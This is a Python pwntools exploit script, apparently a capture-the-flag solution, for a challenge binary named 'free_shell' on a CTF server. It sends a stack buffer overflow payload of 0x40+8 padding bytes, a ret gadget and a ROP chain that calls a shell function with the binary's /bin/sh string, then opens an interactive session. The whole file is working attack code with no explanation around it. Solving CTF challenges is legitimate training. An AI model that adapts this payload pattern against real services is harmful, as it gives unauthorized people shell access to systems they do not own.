from pwn import *

context.binary = elf = ELF('free_shell', checksec=True)
io = remote('chals.cyberthon22t.ctf.sg', 20401)
rop = ROP(elf)
ret = (rop.find_gadget(['ret']))[0]
rop.shell(elf.sym.BIN_SH)

offset_to_fill = 0x40+8
payload = b'A' * offset_to_fill + p64(ret) + rop.chain()
io.recvuntil(b'Input =>')
print(rop.dump())
io.sendline(payload)
io.interactive()
